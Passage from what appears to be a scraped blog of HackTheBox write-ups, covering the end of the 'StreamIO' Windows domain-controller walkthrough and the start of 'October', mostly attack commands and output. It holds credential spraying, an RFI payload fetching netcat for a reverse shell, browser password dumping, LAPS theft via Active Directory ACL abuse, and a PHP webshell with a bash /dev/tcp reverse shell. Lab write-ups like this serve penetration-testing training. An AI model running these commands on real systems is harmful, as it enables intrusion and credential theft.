streamIO.htb\\admin:paddpadd STATUS_LOGON_FAILURE SMB 10.10.11.158 445 DC [-] streamIO.htb\\Barry:$hadoW STATUS_LOGON_FAILURE SMB 10.10.11.158 445 DC [-] streamIO.htb\\Bruno:$monique$1991$ STATUS_LOGON_FAILURE SMB 10.10.11.158 445 DC [-] streamIO.htb\\Clara:%$clara STATUS_LOGON_FAILURE SMB 10.10.11.158 445 DC [-] streamIO.htb\\Juliette:$3xybitch STATUS_LOGON_FAILURE SMB 10.10.11.158 445 DC [-] streamIO.htb\\Lauren:##123a8j8w5123## STATUS_LOGON_FAILURE SMB 10.10.11.158 445 DC [-] streamIO.htb\\Lenord:physics69i STATUS_LOGON_FAILURE SMB 10.10.11.158 445 DC [-] streamIO.htb\\Michelle:!?Love?!123 STATUS_LOGON_FAILURE SMB 10.10.11.158 445 DC [-] streamIO.htb\\Sabrina:!!sabrina$ STATUS_LOGON_FAILURE SMB 10.10.11.158 445 DC [-] streamIO.htb\\Thane:highschoolmusical STATUS_LOGON_FAILURE SMB 10.10.11.158 445 DC [-] streamIO.htb\\Victoria:!5psycho8! STATUS_LOGON_FAILURE SMB 10.10.11.158 445 DC [-] streamIO.htb\\yoshihide:66boysandgirls.. STATUS_LOGON_FAILURE We could try the creds on https://streamio.htb/login.php Let\u0026rsquo;s use hydra └─$ hydra -C user-pass.list streamio.htb https-post-form \u0026#34;/login.php:username=^USER^\u0026amp;password=^PASS^:F=Login failed\u0026#34; Hydra v9.5 (c) 2023 by van Hauser/THC \u0026amp; David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway). Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2023-09-19 17:08:23 [DATA] max 12 tasks per 1 server, overall 12 tasks, 12 login tries, ~1 try per task [DATA] attacking http-post-forms://streamio.htb:443/login.php:username=^USER^\u0026amp;password=^PASS^:F=Login failed [4 43][http-post-form] host: streamio.htb login: yoshihide password: 66boysandgirls.. 1 of 1 target successfully completed, 1 valid password found Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2023-09-19 17:08:27 We successfully login And now we have access to admin We have nothing interesting, The url is https://streamio.htb/admin/?staff= When we click the panels, the parameter changes Staff Management -\u0026gt; https://streamio.htb/admin/?staff= Movie Management -\u0026gt; https://streamio.htb/admin/?movie= User Management -\u0026gt; https://streamio.htb/admin/?user= We can try fuzzing the parameter └─$ wfuzz -H \u0026#34;Cookie: PHPSESSID=1oqkt97ah49htfg0tli8rsthor\u0026#34; -w /usr/share/seclists/Discovery/Web-Content/burp-parameter-names.txt -u \u0026#39;https://streamio.htb/admin/?FUZZ=\u0026#39; --hh 1678 /usr/lib/python3/dist-packages/wfuzz/__init__.py:34: UserWarning:Pycurl is not compiled against Openssl. Wfuzz might not work correctly when fuzzing SSL sites. Check Wfuzz\u0026#39;s documentation for more information. ******************************************************** * Wfuzz 3.1.0 - The Web Fuzzer * ******************************************************** Target: https://streamio.htb/admin/?FUZZ= Total requests: 6453 ===================================================================== ID Response Lines Word Chars Payload ===================================================================== 000001575: 200 49 L 137 W 1712 Ch \u0026#34;debug\u0026#34; 000003530: 200 10790 L 25878 W 320235 Ch \u0026#34;movie\u0026#34; 000005450: 200 398 L 916 W 12484 Ch \u0026#34;staff\u0026#34; 000006133: 200 62 L 160 W 2073 Ch \u0026#34;user\u0026#34; Total time: 80.34713 Processed Requests: 6453 Filtered Requests: 6449 Requests/sec.: 80.31400 I was stuck here for a while It looks like when I supply index.php, the page return error So it looks like I missed important endpoint From now on, I will use feroxbuster in the background, which performs recursive directory search └─$ feroxbuster -u https://streamio.htb -x php -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories-lowercase.txt -k ___ ___ __ __ __ __ __ ___ |__ |__ |__) |__) | / ` / \\ \\_/ | | \\ |__ | |___ | \\ | \\ | \\__, \\__/ / \\ | |__/ |___ by Ben \u0026#34;epi\u0026#34; Risher 🤓 ver: 2.10.0 ───────────────────────────┬────────────────────── 🎯 Target Url │ https://streamio.htb 🚀 Threads │ 50 📖 Wordlist │ /usr/share/seclists/Discovery/Web-Content/raft-medium-directories-lowercase.txt 👌 Status Codes │ All Status Codes! 💥 Timeout (secs) │ 7 🦡 User-Agent │ feroxbuster/2.10.0 💉 Config File │ /etc/feroxbuster/ferox-config.toml 🔎 Extract Links │ true 💲 Extensions │ [php] 🏁 HTTP methods │ [GET] 🔓 Insecure │ true 🔃 Recursion Depth │ 4 ───────────────────────────┴────────────────────── 🏁 Press [ENTER] to use the Scan Management Menu™ ────────────────────────────────────────────────── 404 GET 29l 95w 1245c Auto-filtering found 404-like response and created new filter; toggle off with --dont-filter 301 GET 2l 10w 150c https://streamio.htb/admin =\u0026gt; https://streamio.htb/admin/ 301 GET 2l 10w 151c https://streamio.htb/images =\u0026gt; https://streamio.htb/images/ 301 GET 2l 10w 147c https://streamio.htb/js =\u0026gt; https://streamio.htb/js/ 301 GET 2l 10w 148c https://streamio.htb/css =\u0026gt; https://streamio.htb/css/ 200 GET 395l 915w 13497c https://streamio.htb/index.php 200 GET 206l 430w 6434c https://streamio.htb/contact.php 200 GET 231l 571w 7825c https://streamio.htb/about.php 200 GET 51l 213w 19329c https://streamio.htb/images/client.jpg 200 GET 101l 173w 1663c https://streamio.htb/css/responsive.css 200 GET 5l 374w 21257c https://streamio.htb/js/popper.min.js 200 GET 863l 1698w 16966c https://streamio.htb/css/style.css 302 GET 0l 0w 0c https://streamio.htb/logout.php =\u0026gt; https://streamio.htb/ 200 GET 192l 1006w 82931c https://streamio.htb/images/icon.png 200 GET 111l 269w 4145c https://streamio.htb/login.php 200 GET 2l 1276w 88145c https://streamio.htb/js/jquery-3.4.1.min.js 200 GET 367l 1995w 166220c https://streamio.htb/images/contact-img.png 200 GET 191l 253w 3120c https://streamio.htb/css/login.css 200 GET 121l 291w 4500c https://streamio.htb/register.php 301 GET 2l 10w 157c https://streamio.htb/admin/images =\u0026gt; https://streamio.htb/admin/images/ 200 GET 0l 0w 233314c https://streamio.htb/images/about-img.png 200 GET 395l 915w 13497c https://streamio.htb/ 301 GET 2l 10w 153c https://streamio.htb/admin/js =\u0026gt; https://streamio.htb/admin/js/ 301 GET 2l 10w 154c https://streamio.htb/admin/css =\u0026gt; https://streamio.htb/admin/css/ 301 GET 2l 10w 150c https://streamio.htb/fonts =\u0026gt; https://streamio.htb/fonts/ 403 GET 1l 1w 18c https://streamio.htb/admin/index.php 301 GET 2l 10w 156c https://streamio.htb/admin/fonts =\u0026gt; https://streamio.htb/admin/fonts/ 200 GET 274l 1677w 150222c https://streamio.htb/images/barry.png 200 GET 2059l 12754w 1028337c https://streamio.htb/images/samantha.png 200 GET 0l 0w 478934c https://streamio.htb/images/oliver.png 200 GET 2l 6w 58c https://streamio.htb/admin/master.php Now, if I supply master.php to debug It returns everything from STREAMIO database Let\u0026rsquo;s use php filter to dump the source code https://streamio.htb/admin/?debug=php://filter/convert.base64-encode/resource=master.php └─$ echo \u0026#34;...\u0026#34; | base64 -d ... \u0026lt;?php if(isset($_POST[\u0026#39;include\u0026#39;])) { if($_POST[\u0026#39;include\u0026#39;] !== \u0026#34;index.php\u0026#34; ) eval(file_get_contents($_POST[\u0026#39;include\u0026#39;])); else echo(\u0026#34; ---- ERROR ---- \u0026#34;); } ?\u0026gt;base64: invalid input We have a include parameter which we can use It get the contents of the file and passes it to eval We could try RFI I\u0026rsquo;ll try hosting file with system('whoami'); We must have Content-Type: application/x-www-form-urlencoded in our request or it won\u0026rsquo;t work Let\u0026rsquo;s get reverse shell The payload system(\u0026#34;powershell -c wget 10.10.16.6/nc64.exe -outfile \\\\programdata\\\\nc.exe\u0026#34;); system(\u0026#34;\\\\programdata\\\\nc.exe -e powershell 10.10.16.6 6666\u0026#34;); Now we need to set our listener and send a request User #1 Let\u0026rsquo;s enumerate PS C:\\inetpub\u0026gt; findstr /spin \u0026#34;passw\u0026#34; *.php findstr /spin \u0026#34;passw\u0026#34; *.php streamio.htb\\login.php:59:if(isset($_POST[\u0026#39;username\u0026#39;]) \u0026amp;\u0026amp; isset($_POST[\u0026#39;password\u0026#39;])) streamio.htb\\login.php:64: $pass = md5($_POST[\u0026#39;password\u0026#39;]); streamio.htb\\login.php:65: $query = \u0026#34;select * from users where username = \u0026#39;$user\u0026#39; and password = \u0026#39;$pass\u0026#39;\u0026#34;; streamio.htb\\login.php:97: \u0026lt;input type=\u0026#34;password\u0026#34; class=\u0026#34;form-control\u0026#34; placeholder=\u0026#34;Password\u0026#34; name=\u0026#34;password\u0026#34;\u0026gt; streamio.htb\\register.php:58:if(isset($_POST[\u0026#39;username\u0026#39;]) \u0026amp;\u0026amp; isset($_POST[\u0026#39;password\u0026#39;]) \u0026amp;\u0026amp; isset($_POST[\u0026#39;confirm\u0026#39;])) streamio.htb\\register.php:62: ## password match check streamio.htb\\register.php:63: if($_POST[\u0026#39;password\u0026#39;] !== $_POST[\u0026#39;confirm\u0026#39;]) streamio.htb\\register.php:67: Passwords do not match streamio.htb\\register.php:73: $pass = md5($_POST[\u0026#39;password\u0026#39;]); streamio.htb\\register.php:83: $query = \u0026#34;insert into users(username,password,is_staff) values(\u0026#39;$user\u0026#39;,\u0026#39;$pass\u0026#39;,0)\u0026#34;; streamio.htb\\register.php:109: \u0026lt;input type=\u0026#34;password\u0026#34; class=\u0026#34;form-control\u0026#34; placeholder=\u0026#34;Choose a password\u0026#34; name=\u0026#34;password\u0026#34;\u0026gt; streamio.htb\\register.php:118: \u0026lt;input type=\u0026#34;password\u0026#34; class=\u0026#34;form-control\u0026#34; placeholder=\u0026#34;Confirm password\u0026#34; name=\u0026#34;confirm\u0026#34;\u0026gt; PS C:\\inetpub\u0026gt; findstr /spin \u0026#34;pwd\u0026#34; *.php findstr /spin \u0026#34;pwd\u0026#34; *.php streamio.htb\\admin\\index.php:9:$connection = array(\u0026#34;Database\u0026#34;=\u0026gt;\u0026#34;STREAMIO\u0026#34;, \u0026#34;UID\u0026#34; =\u0026gt; \u0026#34;db_admin\u0026#34;, \u0026#34;PWD\u0026#34; =\u0026gt; \u0026#39;B1@hx31234567890\u0026#39;); streamio.htb\\login.php:46:$connection = array(\u0026#34;Database\u0026#34;=\u0026gt;\u0026#34;STREAMIO\u0026#34; , \u0026#34;UID\u0026#34; =\u0026gt; \u0026#34;db_user\u0026#34;, \u0026#34;PWD\u0026#34; =\u0026gt; \u0026#39;B1@hB1@hB1@h\u0026#39;); streamio.htb\\register.php:81: $connection = array(\u0026#34;Database\u0026#34;=\u0026gt;\u0026#34;STREAMIO\u0026#34;, \u0026#34;UID\u0026#34; =\u0026gt; \u0026#34;db_admin\u0026#34;, \u0026#34;PWD\u0026#34; =\u0026gt; \u0026#39;B1@hx31234567890\u0026#39;); watch.streamio.htb\\search.php:15:$connection = array(\u0026#34;Database\u0026#34;=\u0026gt;\u0026#34;STREAMIO\u0026#34;, \u0026#34;UID\u0026#34; =\u0026gt; \u0026#34;db_user\u0026#34;, \u0026#34;PWD\u0026#34; =\u0026gt; \u0026#39;B1@hB1@hB1@h\u0026#39;); Now we can connect to db as db_admin The box has sqlcmd PS C:\\inetpub\u0026gt; where.exe sqlcmd where.exe sqlcmd C:\\Program Files\\Microsoft SQL Server\\Client SDK\\ODBC\\170\\Tools\\Binn\\SQLCMD.EXE PS C:\\inetpub\u0026gt; sqlcmd /? sqlcmd /? Microsoft (R) SQL Server Command Line Tool Version 15.0.2000.5 NT Copyright (C) 2019 Microsoft Corporation. All rights reserved. usage: Sqlcmd [-U login id] [-P password] [-S server] [-H hostname] [-E trusted connection] [-N Encrypt Connection][-C Trust Server Certificate] [-d use database name] [-l login timeout] [-t query timeout] [-h headers] [-s colseparator] [-w screen width] [-a packetsize] [-e echo input] [-I Enable Quoted Identifiers] [-c cmdend] [-L[c] list servers[clean output]] [-q \u0026#34;cmdline query\u0026#34;] [-Q \u0026#34;cmdline query\u0026#34; and exit] [-m errorlevel] [-V severitylevel] [-W remove trailing spaces] [-u unicode output] [-r[0|1] msgs to stderr] [-i inputfile] [-o outputfile] [-z new password] [-f \u0026lt;codepage\u0026gt; | i:\u0026lt;codepage\u0026gt;[,o:\u0026lt;codepage\u0026gt;]] [-Z new password and exit] [-k[1|2] remove[replace] control characters] [-y variable length type display width] [-Y fixed length type display width] [-p[1] print statistics[colon format]] [-R use client regional setting] [-K application intent] [-M multisubnet failover] [-b On error batch abort] [-v var = \u0026#34;value\u0026#34;...] [-A dedicated admin connection] [-X[1] disable commands, startup script, environment variables [and exit]] [-x disable variable substitution] [-j Print raw error messages] [-g enable column encryption] [-G use Azure Active Directory for authentication] [-? show syntax summary] Let\u0026rsquo;s connect as db_admin and query from streamio_backup database PS C:\\inetpub\u0026gt; sqlcmd -S localhost -U db_admin -P B1@hx31234567890 -d streamio_backup -Q \u0026#34;select table_name from streamio_backup.information_schema.tables;\u0026#34; sqlcmd -S localhost -U db_admin -P B1@hx31234567890 -d streamio_backup -Q \u0026#34;select table_name from streamio_backup.information_schema.tables;\u0026#34; table_name -------------------------------------------------------------------------------------------------------------------------------- movies users (2 rows affected) PS C:\\inetpub\u0026gt; sqlcmd -S localhost -U db_admin -P B1@hx31234567890 -d streamio_backup -Q \u0026#34;select * from users;\u0026#34; sqlcmd -S localhost -U db_admin -P B1@hx31234567890 -d streamio_backup -Q \u0026#34;select * from users;\u0026#34; id username password ----------- -------------------------------------------------- -------------------------------------------------- 1 nikk37 389d14cb8e4e9b94b137deb1caf0612a 2 yoshihide b779ba15cedfd22a023c4d8bcf5f2332 3 James c660060492d9edcaa8332d89c99c9239 4 Theodore 925e5408ecb67aea449373d668b7359e 5 Samantha 083ffae904143c4796e464dac33c1f7d 6 Lauren 08344b85b329d7efd611b7a7743e8a09 7 William d62be0dc82071bccc1322d64ec5b6c51 8 Sabrina f87d3c0d6c8fd686aacc6627f1f493a5 (8 rows affected) Now we try cracking again └─$ hashcat -m 0 user-hash.list /usr/share/wordlists/rockyou.txt --user hashcat (v6.2.6) starting ... 389d14cb8e4e9b94b137deb1caf0612a:get_dem_girls2@yahoo.com Approaching final keyspace - workload adjusted. ... └─$ hashcat -m 0 user-hash.list /usr/share/wordlists/rockyou.txt --user --show nikk37:389d14cb8e4e9b94b137deb1caf0612a:get_dem_girls2@yahoo.com yoshihide:b779ba15cedfd22a023c4d8bcf5f2332:66boysandgirls.. Lauren:08344b85b329d7efd611b7a7743e8a09:##123a8j8w5123## Sabrina:f87d3c0d6c8fd686aacc6627f1f493a5:!!sabrina$ Now let\u0026rsquo;s check if creds for nikk37 are valid └─$ crackmapexec smb 10.10.11.158 -u \u0026#39;nikk37\u0026#39; -p \u0026#39;get_dem_girls2@yahoo.com\u0026#39; SMB 10.10.11.158 445 DC [*] Windows 10.0 Build 17763 x64 (name:DC) (domain:streamIO.htb) (signing:True) (SMBv1:False) SMB 10.10.11.158 445 DC [+] streamIO.htb\\nikk37:get_dem_girls2@yahoo.com And we can winrm └─$ crackmapexec winrm 10.10.11.158 -u \u0026#39;nikk37\u0026#39; -p \u0026#39;get_dem_girls2@yahoo.com\u0026#39; SMB 10.10.11.158 5985 DC [*] Windows 10.0 Build 17763 (name:DC) (domain:streamIO.htb) HTTP 10.10.11.158 5985 DC [*] http://10.10.11.158:5985/wsman WINRM 10.10.11.158 5985 DC [+] streamIO.htb\\nikk37:get_dem_girls2@yahoo.com (Pwn3d!) User #2 The box has Firefox installed *Evil-WinRM* PS C:\\\u0026gt; ls \u0026#34;Program Files (x86)\u0026#34; Directory: C:\\Program Files (x86) Mode LastWriteTime Length Name ---- ------------- ------ ---- d----- 9/15/2018 12:28 AM Common Files d----- 2/25/2022 11:35 PM IIS d----- 2/25/2022 11:38 PM iis express d----- 3/28/2022 4:46 PM Internet Explorer d----- 2/22/2022 1:54 AM Microsoft SQL Server d----- 2/22/2022 1:53 AM Microsoft.NET d----- 5/26/2022 4:09 PM Mozilla Firefox d----- 5/26/2022 4:09 PM Mozilla Maintenance Service d----- 2/25/2022 11:33 PM PHP d----- 2/22/2022 2:56 AM Reference Assemblies d----- 3/28/2022 4:46 PM Windows Defender d----- 3/28/2022 4:46 PM Windows Mail d----- 3/28/2022 4:46 PM Windows Media Player d----- 9/15/2018 12:19 AM Windows Multimedia Platform d----- 9/15/2018 12:28 AM windows nt d----- 3/28/2022 4:46 PM Windows Photo Viewer d----- 9/15/2018 12:19 AM Windows Portable Devices d----- 9/15/2018 12:19 AM WindowsPowerShell And nikk37 has 2 profiles *Evil-WinRM* PS C:\\\u0026gt; ls C:\\Users\\nikk37\\AppData\\roaming\\mozilla\\Firefox\\Profiles Directory: C:\\Users\\nikk37\\AppData\\roaming\\mozilla\\Firefox\\Profiles Mode LastWriteTime Length Name ---- ------------- ------ ---- d----- 2/22/2022 2:40 AM 5rwivk2l.default d----- 2/22/2022 2:42 AM br53rxeg.default-release Let\u0026rsquo;s check them We can download key4.db and logins.json files and use Firepwd to extract Or use LaZagne *Evil-WinRM* PS C:\\users\\nikk37\u0026gt; wget 10.10.16.6/LaZagne.exe -outfile lz.exe *Evil-WinRM* PS C:\\users\\nikk37\u0026gt; .\\lz.exe all |====================================================================| | | | The LaZagne Project | | | | ! BANG BANG ! | | | |====================================================================| ########## User: nikk37 ########## ------------------- Firefox passwords ----------------- [+] Password found !!! URL: https://slack.streamio.htb Login: JDgodd Password: password@12 [+] Password found !!! URL: https://slack.streamio.htb Login: yoshihide Password: paddpadd@12 [+] Password found !!! URL: https://slack.streamio.htb Login: admin Password: JDg0dd1s@d0p3cr3@t0r [+] Password found !!! URL: https://slack.streamio.htb Login: nikk37 Password: n1kk1sd0p3t00:) [+] 4 passwords have been found. For more information launch it again with the -v option elapsed time = 0.14062094688415527 Let\u0026rsquo;s check creds We know the passwords for nikk37 and yoshihide So we check the creds for admin and JDgodd └─$ crackmapexec smb 10.10.11.158 -u user.list -p pass.list --continue-on-success SMB 10.10.11.158 445 DC [*] Windows 10.0 Build 17763 x64 (name:DC) (domain:streamIO.htb) (signing:True) (SMBv1:False) SMB 10.10.11.158 445 DC [-] streamIO.htb\\admin:password@12 STATUS_LOGON_FAILURE SMB 10.10.11.158 445 DC [-] streamIO.htb\\admin:paddpadd@12 STATUS_LOGON_FAILURE SMB 10.10.11.158 445 DC [-] streamIO.htb\\admin:JDg0dd1s@d0p3cr3@t0r STATUS_LOGON_FAILURE SMB 10.10.11.158 445 DC [-] streamIO.htb\\admin:n1kk1sd0p3t00:) STATUS_LOGON_FAILURE SMB 10.10.11.158 445 DC [-] streamIO.htb\\JDgodd:password@12 STATUS_LOGON_FAILURE SMB 10.10.11.158 445 DC [-] streamIO.htb\\JDgodd:paddpadd@12 STATUS_LOGON_FAILURE SMB 10.10.11.158 445 DC [+] streamIO.htb\\JDgodd:JDg0dd1s@d0p3cr3@t0r SMB 10.10.11.158 445 DC [-] streamIO.htb\\JDgodd:n1kk1sd0p3t00:) STATUS_LOGON_FAILURE Now we have another user JDgodd:JDg0dd1s@d0p3cr3@t0r But we can\u0026rsquo;t winrm, since he doesn\u0026rsquo;t have privileges *Evil-WinRM* PS C:\\users\\nikk37\u0026gt; net user JDgodd User name JDgodd Full Name Comment User\u0026#39;s comment Country/region code 000 (System Default) Account active Yes Account expires Never Password last set 2/22/2022 2:56:42 AM Password expires Never Password changeable 2/23/2022 2:56:42 AM Password required Yes User may change password Yes Workstations allowed All Logon script User profile Home directory Last logon 9/20/2023 5:24:58 PM Logon hours allowed All Local Group Memberships Global Group memberships *Domain Users The command completed successfully. Root Let\u0026rsquo;s enumerate the domain using bloodhound └─$ bloodhound-python -c all -u \u0026#39;JDgodd\u0026#39; -p \u0026#39;JDg0dd1s@d0p3cr3@t0r\u0026#39; -d streamio.htb -dc streamio.htb -ns 10.10.11.158 --zip INFO: Found AD domain: streamio.htb INFO: Getting TGT for user WARNING: Failed to get Kerberos TGT. Falling back to NTLM authentication. Error: Kerberos SessionError: KRB_AP_ERR_SKEW(Clock skew too great) INFO: Connecting to LDAP server: streamio.htb INFO: Found 1 domains INFO: Found 1 domains in the forest INFO: Found 1 computers INFO: Connecting to LDAP server: streamio.htb INFO: Found 8 users INFO: Found 54 groups INFO: Found 4 gpos INFO: Found 1 ous INFO: Found 19 containers INFO: Found 0 trusts INFO: Starting computer enumeration with 10 workers INFO: Querying computer: DC.streamIO.htb INFO: Done in 00M 24S INFO: Compressing output into 20230920182850_bloodhound.zip We have WriteOwner over Core Staff which can read LAPS password of DC Let\u0026rsquo;s upload powerview and perform our attack https://bloodhound.readthedocs.io/en/latest/data-analysis/edges.html#writeowner https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/abusing-active-directory-acls-aces#writeowner-on-group *Evil-WinRM* PS C:\\users\\nikk37\u0026gt; wget 10.10.16.6/powerview.ps1 -outfile powerview.ps1 *Evil-WinRM* PS C:\\users\\nikk37\u0026gt; . .\\powerview.ps1 *Evil-WinRM* PS C:\\users\\nikk37\u0026gt; $password = ConvertTo-SecureString \u0026#39;JDg0dd1s@d0p3cr3@t0r\u0026#39; -AsPlainText -Force *Evil-WinRM* PS C:\\users\\nikk37\u0026gt; $creds = New-Object System.Management.Automation.PSCredential(\u0026#39;JDgodd\u0026#39;, $password) *Evil-WinRM* PS C:\\users\\nikk37\u0026gt; Set-DomainObjectOwner -Identity \u0026#39;Core Staff\u0026#39; -OwnerIdentity \u0026#39;JDgodd\u0026#39; -Credential $creds *Evil-WinRM* PS C:\\users\\nikk37\u0026gt; Add-DomainObjectAcl -Credential $creds -TargetIdentity \u0026#39;Core Staff\u0026#39; -PrincipalIdentity \u0026#39;JDgodd\u0026#39; *Evil-WinRM* PS C:\\users\\nikk37\u0026gt; Add-DomainGroupMember -Credential $creds -Identity \u0026#39;Core Staff\u0026#39; -Members \u0026#39;JDgodd\u0026#39; *Evil-WinRM* PS C:\\users\\nikk37\u0026gt; net user jdgodd User name JDgodd Full Name Comment User\u0026#39;s comment Country/region code 000 (System Default) Account active Yes Account expires Never Password last set 2/22/2022 2:56:42 AM Password expires Never Password changeable 2/23/2022 2:56:42 AM Password required Yes User may change password Yes Workstations allowed All Logon script User profile Home directory Last logon 9/20/2023 5:41:37 PM Logon hours allowed All Local Group Memberships Global Group memberships *Domain Users *CORE STAFF The command completed successfully. *Evil-WinRM* PS C:\\users\\nikk37\u0026gt; Get-AdComputer -Filter * -Properties ms-Mcs-AdmPwd -Credential $creds DistinguishedName : CN=DC,OU=Domain Controllers,DC=streamIO,DC=htb DNSHostName : DC.streamIO.htb Enabled : True ms-Mcs-AdmPwd : 9-{dc@T0rG5lp1 Name : DC ObjectClass : computer ObjectGUID : 8c0f9a80-aaab-4a78-9e0d-7a4158d8b9ee SamAccountName : DC$ SID : S-1-5-21-1470860369-1569627196-4264678630-1000 UserPrincipalName : Now we can wirnm as administrator The flag is located in Martin\u0026rsquo;s desktop *Evil-WinRM* PS C:\\users\u0026gt; gci -include root.txt -recurse -path . Directory: C:\\users\\Martin\\Desktop Mode LastWriteTime Length Name ---- ------------- ------ ---- -ar--- 9/20/2023 4:46 PM 34 root.txt Apparently we could also retrieve LAPS password via crackmapexec └─$ crackmapexec smb 10.10.11.158 -u JDgodd -p \u0026#39;JDg0dd1s@d0p3cr3@t0r\u0026#39; --laps --ntds SMB 10.10.11.158 445 DC [*] Windows 10.0 Build 17763 x64 (name:DC) (domain:streamIO.htb) (signing:True) (SMBv1:False) SMB 10.10.11.158 445 DC [-] DC\\administrator:9-{dc@T0rG5lp1 STATUS_LOGON_FAILURE ","date":"September 11, 2023","hero":"/posts/cybersecurity/hackthebox/machines/windows/streamio/images/streamio.png","permalink":"https://umarbaevb.github.io/posts/cybersecurity/hackthebox/machines/windows/streamio/","summary":"StreamIO Enumeration nmap └─$ nmap -Pn -p- 10.10.11.158 -T4 --min-rate 10000 Starting Nmap 7.94 ( https://nmap.org ) at 2023-09-13 19:18 BST Nmap scan report for 10.10.11.158 (10.10.11.158) Host is up (0.10s latency). Not shown: 65517 filtered tcp ports (no-response) PORT STATE SERVICE 53/tcp open domain 80/tcp open http 88/tcp open kerberos-sec 135/tcp open msrpc 139/tcp open netbios-ssn 389/tcp open ldap 443/tcp open https 445/tcp open microsoft-ds 464/tcp open kpasswd5 593/tcp open http-rpc-epmap 636/tcp open ldapssl 5985/tcp open wsman 9389/tcp open adws 49667/tcp open unknown 49673/tcp open unknown 49674/tcp open unknown 49701/tcp open unknown 55287/tcp open unknown Nmap done: 1 IP address (1 host up) scanned in 32.","tags":["HTB","domain-controller","php","vhosts","feroxbuster","sqli","sqli-union","waf","hashcat","hydra","lfi","rfi","mssql","sqlcmd","evil-winrm","firefox","firepwd","bloodhound","bloodhound-python","laps","writeowner"],"title":"[HTB] Machine: StreamIO"},{"categories":null,"contents":"October Enumeration nmap └─$ nmap -Pn -p- 10.10.10.16 -T4 Starting Nmap 7.94 ( https://nmap.org ) at 2023-09-10 17:39 BST Nmap scan report for 10.10.10.16 (10.10.10.16) Host is up (0.092s latency). Not shown: 65533 filtered tcp ports (no-response) PORT STATE SERVICE 22/tcp open ssh 80/tcp open http └─$ nmap -Pn -p22,80 -sC -sV 10.10.10.16 -T4 Starting Nmap 7.94 ( https://nmap.org ) at 2023-09-10 17:44 BST Nmap scan report for 10.10.10.16 (10.10.10.16) Host is up (0.12s latency). PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 6.6.1p1 Ubuntu 2ubuntu2.8 (Ubuntu Linux; protocol 2.0) | ssh-hostkey: | 1024 79:b1:35:b6:d1:25:12:a3:0c:b5:2e:36:9c:33:26:28 (DSA) | 2048 16:08:68:51:d1:7b:07:5a:34:66:0d:4c:d0:25:56:f5 (RSA) | 256 e3:97:a7:92:23:72:bf:1d:09:88:85:b6:6c:17:4e:85 (ECDSA) |_ 256 89:85:90:98:20:bf:03:5d:35:7f:4a:a9:e1:1b:65:31 (ED25519) 80/tcp open http Apache httpd 2.4.7 ((Ubuntu)) | http-methods: |_ Potentially risky methods: PUT PATCH DELETE |_http-server-header: Apache/2.4.7 (Ubuntu) |_http-title: October CMS - Vanilla Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 13.66 seconds Web server gobuster └─$ gobuster dir -u http://10.10.10.16/ -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -t 50 txt,php --no-error =============================================================== Gobuster v3.5 by OJ Reeves (@TheColonial) \u0026amp; Christian Mehlmauer (@firefart) =============================================================== [+] Url: http://10.10.10.16/ [+] Method: GET [+] Threads: 50 [+] Wordlist: /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt [+] Negative Status codes: 404 [+] User Agent: gobuster/3.5 [+] Timeout: 10s =============================================================== 2023/09/10 17:47:42 Starting gobuster in directory enumeration mode =============================================================== /blog (Status: 200) [Size: 4253] /forum (Status: 200) [Size: 9589] /themes (Status: 301) [Size: 310] [--\u0026gt; http://10.10.10.16/themes/] /modules (Status: 301) [Size: 311] [--\u0026gt; http://10.10.10.16/modules/] /tests (Status: 301) [Size: 309] [--\u0026gt; http://10.10.10.16/tests/] /storage (Status: 301) [Size: 311] [--\u0026gt; http://10.10.10.16/storage/] /plugins (Status: 301) [Size: 311] [--\u0026gt; http://10.10.10.16/plugins/] /backend (Status: 302) [Size: 400] [--\u0026gt; http://10.10.10.16/backend/backend/auth] /vendor (Status: 301) [Size: 310] [--\u0026gt; http://10.10.10.16/vendor/] /config (Status: 301) [Size: 310] [--\u0026gt; http://10.10.10.16/config/] Foothold/User From gobuster results we see backend endpoint Googling also shows that there is a October CMS Default creds admin:admin works We can now perform https://www.exploit-db.com/exploits/41936 We can perform PHP upload protection bypass to upload a webshell We can upload .php5 file with \u0026lt;?php system($_REQUEST['cmd']); ?\u0026gt; └─$ curl \u0026#39;http://10.10.10.16/storage/app/media/shell.php5?cmd=id\u0026#39; uid=33(www-data) gid=33(www-data) groups=33(www-data) Let\u0026rsquo;s get reverse shell └─$ curl \u0026#39;http://10.10.10.16/storage/app/media/shell.php5?cmd=bash+-c+\u0026#34;bash+-i+\u0026gt;%26+/dev/tcp/10.10.16.9/6666+0\u0026gt;%261\u0026#34;\u0026#39; Root Running linpeas We have unknown suid binary ovrflw Probably binary exploitation ovrflw └─$ file ovrflw ovrflw: ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux.so.2, for GNU/Linux 2.6.24, BuildID[sha1]=004cdf754281f7f7a05452ea6eaf1ee9014f07da, not stripped └─$ ./ovrflw Syntax: ./ovrflw \u0026lt;input string\u0026gt; Check protections NX is enabled, thus we can\u0026rsquo;t run shellcode from stack └─$ gdb ovrflw ... pwndbg\u0026gt; checksec [*] Checking for new versions of pwntools To disable this functionality, set the contents of /home/kali/.cache/.pwntools-cache-3.11/update to \u0026#39;never\u0026#39; (old way). Or add the following lines to ~/.pwn.conf or ~/.config/pwn.conf (or /etc/pwn.conf system-wide): [update] interval=never [*] You have the latest version of Pwntools (4.10.0) [*] \u0026#39;/home/kali/Documents/tasks/ovrflw\u0026#39; Arch: i386-32-little RELRO: Partial RELRO Stack: No canary found NX: NX enabled PIE: No PIE (0x8048000) ASLR is also on www-data@october:/var/www/html/cms/storage/app/media$ sysctl -a --pattern \u0026#34;randomize\u0026#34; kernel.randomize_va_space = 2 Let\u0026rsquo;s start with creating paylod to find an offset └─$ msf-pattern_create -l 500 